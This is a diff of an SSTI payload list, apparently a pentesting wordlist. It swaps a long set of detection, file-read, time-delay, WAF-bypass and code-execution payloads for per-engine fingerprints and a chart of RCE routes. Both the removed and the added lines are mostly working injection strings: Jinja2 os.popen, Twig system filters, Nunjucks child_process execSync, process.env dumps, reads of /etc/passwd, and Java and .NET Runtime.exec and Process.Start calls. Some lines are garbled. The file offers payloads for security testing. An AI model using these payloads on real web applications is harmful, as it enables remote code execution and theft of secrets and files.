@@ -1,289 +1,101 @@
-# ==================== MATH DETECTION (ALWAYS TEST FIRST) ====================
-{{7*7}}
-${7*7}
-${{7*7}}
-{{7*'7'}}
-#{7*7}
-*{7*7}
-{7*7}
-<${{7*7}}>
-<%= 7*7 %>
-{{7*7}}
-${7*7}
-${{7*7}}
-{{7*7}}}
-{{7*7}}]
-{{7*7}}"
-{{7*7}}'
-{{7*7}}%00
-{{7*7}}%0a
-{{7*7}}%0d
-{{7*7}}%09
-{{7*7}}%20
-{{7*7}}#
+# ==================== SSTI ENGINE FINGERPRINT + FAST CONFIRM ====================
+# After the math probe works (ssti-detection-2026.txt), identify the engine
+# with these per-engine markers, then jump to ssti-to-rce-2026.txt.
+# Authorized targets only.
 
-# ==================== IDENTIFICATION PAYLOADS ====================
-{{config}}
-{{self}}
-{{_self}}
-${.vars}
-{{app.request.server.all}}
-{$smarty.version}
-{{_self.env.registerUndefinedFilterCallback("exec")}}
+# ---------- JINJA2 (Python: Flask/Django/Tornado) ----------
+{{config}}                                   # <class 'flask.config.Config'> = Flask+Jinja2
 {{config.__class__.__init__.__globals__}}
-{{''.__class__.__mro__[2].__subclasses__()}}
-${"freemarker.template.utility.Execute"?new()}
-#set($x=$class.inspect("java.lang.Runtime"))
-{{dump(app)}}
-{{=7*7}}
-{=7*7}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-
-# ==================== JINJA2 SPECIFIC ====================
-{{7*7}}
-{{config}}
-{{self}}
-{{''.__class__}}
-{{''.__class__.__mro__}}
-{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__}}                             # <class 'str'>  -> Python
+{{7*7}}{{"7"*7}}?                            # string repeat math
+{{cycler.__init__.__globals__}}              # most-used detection, huge dict
 {{url_for.__globals__}}
 {{get_flashed_messages.__globals__}}
 {{request.application.__globals__}}
-{{cycler.__init__.__globals__}}
 {{joiner.__init__.__globals__}}
 {{namespace.__init__.__globals__}}
-{{lipsum.__globals__}}
-{{range.__globals__}}
 {{dict.__globals__}}
-{{config.items()}}
-{{config.__class__.__init__}}
-{{config.__class__.__dict__}}
-{{''.__class__.__bases__}}
-{{''.__class__.__base__}}
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{range().__class__.__globals__}}
 
-# ==================== TWIG SPECIFIC ====================
-{{7*7}}
-{{_self}}
-{{_self.env}}
-{{_self.env.registerUndefinedFilterCallback}}
-{{_self.env.getFilter}}
-{{_self.env.setLoader}}
-{{_context}}
-{{app.request.server.all}}
-{{constant('_self')}}
-{{dump(app)}}
-{{var_dump(app)}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['id']|map('system')}}
+# ---------- TWIG (PHP: Symfony/Drupal/WordPress plugins) ----------
+{{_self.env}}                                # Twig\Environment object
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{['id']|map('system')}}                     # filter/sandbox alpha exploit
 {{'/etc/passwd'|file_excerpt(1,30)}}
+{{'/etc/passwd'|file_get_contents}}
+{{_context}}                                 # Symfony context dumps
 
-# ==================== FREEMARKER SPECIFIC ====================
-${7*7}
-${.vars}
-${.data_model}
-${.main}
-${.version}
-${.current_template_name}
-${.output_encoding}
-${.locale}
-${.time_zone}
-${.url_escaping_charset}
-${.template_language}
-${.template_name}
-${.node}
-${.node_name}
-${.node_type}
-${.node_namespace}
+# ---------- NUNJUCKS (Node.js) ----------
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+{{this.constructor.constructor('return process.env')()}}
+{{constructor.constructor('return this.process.mainModule.require("child_process").execSync("id")')()}}
+
+# ---------- FREEMARKER (Java) ----------
+${.version} ${.data_model} ${.vars} ${.current_template_name}
 ${"freemarker.template.utility.Execute"?new()}
-${"freemarker.template.utility.Execute"?new()("id")}
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-${.vars["freemarker.template.utility.Execute"]("id")}
+${.now}                                      # java.util.Date -> Java
 
-# ==================== VELOCITY SPECIFIC ====================
-#set($x=7*7)${x}
-#set($x=$x.class)
+# ---------- VELOCITY (Java) ----------
+#set($x=$x.class) ${x}                        # java.lang.String -> Java
+#set($x=$class.inspect("java.lang.Runtime"))
 #set($x=$x.forName("java.lang.Runtime"))
-#set($x=$x.getRuntime())
-#set($x=$x.exec("id"))
-${x}
-#set($str=$class.inspect("java.lang.String"))
-#set($ex=$str.valueOf($class.inspect("java.lang.Runtime").getRuntime().exec("id")))
-#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))
 
-# ==================== SMARTER SPECIFIC ====================
+# ---------- THYMELEAF / JSP EL / OGNL (Java) ----------
+$( ${7*7} and #{7*7} both + [[${...}]] rendering )   # Thymeleaf
+${T(java.lang.Runtime).getRuntime()}                 # EL/Thymeleaf T() prefix
+${1+1} ${'#'}?                                        # JSP EL
+${#rt = @java.lang.Runtime@getRuntime()}              # OGNL @class@method
+
+# ---------- SMARTER (PHP) ----------
+{$smarty.version}
 {$smarty.now}
-{$smarty.version}
-{$smarty.const}
-{$smarty.config}
-{$smarty.ldelim}
-{$smarty.rdelim}
-{php}phpinfo();{/php}
-{php}system('id');{/php}
-{literal}system('id'){/literal}
-{include file="input"}
-{$smarty.version}
-{$smarty.now|date_format:"%Y"}
+{* comment *} math via {7*7}
+{$smarty.const._FILE_}
+{php}phpinfo();{/php}                  # Smarty <= 2 scripts eval tag
 
-# ==================== ERB (RUBY) SPECIFIC ====================
+# ---------- ERB (Ruby on Rails) ----------
 <%= 7*7 %>
-<%= system("id") %>
-<%= `id` %>
-<%= File.open('/etc/passwd').read %>
 <%= ENV['PATH'] %>
-<%= request.env %>
-<%= @user.name %>
-<%= user.name %>
-<%= system('cat /etc/passwd') %>
-<%= `ls -la` %>
+<%= File.open('/etc/passwd').read %>
+<%= `id` %>
 
-# ==================== JADE/PUG SPECIFIC ====================
-#{7*7}
-#{7*7}
-#{function(){return 7*7}()}
-#{{7*7}}
-#{7*7}00
-#{7*7}}
-#{{7*7}}
-#{{7*7}}
-#{{7*7}}
+# ---------- PUG / JADE (Node.js) ----------
+#{(7*7)}   #{(function(){return 7*7}())}
 
-# ==================== HANDLEBARS SPECIFIC ====================
-{{7*7}}
-{{7*7}}
-{{{7*7}}}
-{{> 7*7}}
-{{> (7*7)}}
-{{#> 7*7}}
-{{! 7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
+# ---------- HANDLEBARS / Moustache (JS, sandboxed) ----------
+{{7*7}} (math usually does NOT run - safe default)
+{{{data}}}
+{{> partial}}  {{{> (helper)} }}
 
-# ==================== DOT (C#) SPECIFIC ====================
+# ---------- DOT / RAZOR (.NET / ASP.NET Core) ----------
 @(7*7)
-@(7*7)
-@{7*7}
-@{
-    var x = 7*7;
-    @x
-}
-@if(7*7==49){@true}
-@(7*7)
-@(7*7)
-@(7*7)
+@{ var x = 7*7; @x }
+@if(7*7==49){<text>hit</text>}
+@{ ViewData["x"]=7*7; }@ViewData["x"]
 
-# ==================== BLIND SSTI (TIME DELAY) ====================
-{{sleep(5)}}
-{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('sleep 5', shell=True, stdout=-1).communicate()}}
-{{self.__init__.__globals__.os.system('sleep 5')}}
-{{url_for.__globals__.os.system('sleep 5')}}
-{{get_flashed_messages.__globals__.os.system('sleep 5')}}
-{{cycler.__init__.__globals__.os.system('sleep 5')}}
-${"sleep".execute(5)}
-<%= system("sleep 5") %>
-{php}sleep(5);{/php}
-#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))
+# ---------- GROOVY / GSTRING (Java) ----------
+${7*7} with output "49" but ${"$"}{...} errors
+${"${7*7}"}
+${"x"+1}
+# RCE: GString closure <g>: ${"".class.forName("java.lang.Runtime").getRuntime().exec("id")}
 
-# ==================== RCE PAYLOADS ====================
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-${"freemarker.template.utility.Execute"?new()("id")}
-<%= system("id") %>
-{php}system('id');{/php}
-{{['id']|map('system')}}
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{url_for.__globals__.os.popen('id').read()}}
-{{get_flashed_messages.__globals__.os.popen('id').read()}}
+# ---------- PEBBLE (Java) ----------
+{{7*7}}
+{{'x'.class.forName('java.lang.Runtime')}}
+{{request.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
 
-# ==================== FILE READ PAYLOADS ====================
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
-{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').readlines()}}
-{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}
-{{url_for.__globals__.os.popen('cat /etc/passwd').read()}}
+# ---------- GO TEMPLATES (sandboxed by default) ----------
+{{print .}}  {{printf "%s" "x"}}  (no math or exec - note & mark sandboxed)
 
-# ==================== WAF BYPASS ENCODED ====================
-%7B%7B7%2A7%7D%7D
-%24%7B7%2A7%7D
-%7B%7Bconfig%7D%7D
-%7B%7Bself%7D%7D
-%7B%7B''.__class__.__mro__%5B2%5D.__subclasses__()%7D%7D
-%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('id').read()%7D%7D
-%7B%7B7*7%7D%7D%00
-%7B%7B7*7%7D%7D%0a
-%7B%7B7*7%7D%7D%09
-%7B%7B7*7%7D%7D%20
-%7B%7B7*7%7D%7D%23
-%257B%257B7%252A7%257D%257D
-%2524%257B7%252A7%257D
-
-# ==================== COMMENT BYPASS ====================
-{{/*7*7*/}}
-{{#7*7#}}
-{{# 7*7 #}}
-{{!-- 7*7 --}}
-{{/* 7*7 */}}
-{{=7*7=}}
-{{!7*7}}
-{{7*7<!-- -->}}
-{{7*7<!---->}}
-{{7*7<#-- -->}}
-
-# ==================== WHITESPACE BYPASS ====================
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-
-# ==================== ADVANCED BYPASS ====================
-{% set x=7*7 %}{{x}}
-{% with x=7*7 %}{{x}}{% endwith %}
-{% do x=7*7 %}{{x}}
-${(7*7)::()}
-${(7*7)?string}
-${(7*7)?c}
-${(7*7)?upper}
-${(7*7)?lower}
-{{(7*7)|safe}}
-{{(7*7)|escape}}
-{{(7*7)|default(49)}}
-{{(7*7)|length}}
-{{(7*7)|string}}
-
-# ==================== RAPID DETECTION (TEST ALL ENGINES) ====================
-{{7*7}}${7*7}${{7*7}}<%=7*7%>#{7*7}*{7*7}{7*7}{{7*7}}<%=7*7%><%7*7%><%=7*7%><%#7*7%><%7*7%><%7*7%><%7*7%><%=7*7%><%=7*7%><%=7*7%>
-
-# ==================== 2026 LATEST PAYLOADS ====================
-{{7*7}}?{{7*7}}
-{{7*7}}#{{7*7}}
-{{7*7}}&{{7*7}}
-{{7*7}}+{{7*7}}
-{{7*7}}/{{7*7}}
-{{7*7}}\{{7*7}}
-{{7*7}}|{{7*7}}
-{{7*7}}.{{7*7}}
-{{7*7}}:{{7*7}}
-{{7*7}};{{7*7}}
-{{7*7}},{{7*7}}
-{{7*7}}!{{7*7}}
-{{7*7}}?{{7*7}}
-{{7*7}}~{{7*7}}
-{{range(7*7)}}
-{{[0:7*7]}}
-{{(7*7).__class__}}
-{{(7*7).__class__.__bases__}}
-{{(7*7).__class__.__mro__}}
+# ==================== FAST CHART ====================
+# Engine        | Detect with            | RCE route
+# Jinja2/Twig   | {{7*7}}                | SSTI [state] section of ssti-to-rce
+# Nunjucks      | {{7*7}}                | filter constructor RCE
+# FreeMarker    | ${7*7}                 | Execute?new()
+# Velocity      | #set($x=7*7)${x}       | inspect("java.lang.Runtime")
+# Thymeleaf     | [[${7*7}]]             | ${T(...).exec()}
+# EL            | ${7*7}                 | T(java.lang.Runtime)
+# OGNL         | ${#rt=@java.lang.Runtime@getRuntime(),#rt.exec("id")}
+# Smarty        | {7*7} or {$smarty.ldelim} | {php} tag / function entries
+# ERB           | <%= 7*7 %>             | <%= system("id") %>
+# Razor/DOT     | @(7*7)                 | @(System.Diagnostics.Process.Start("cmd.exe","/c id"))
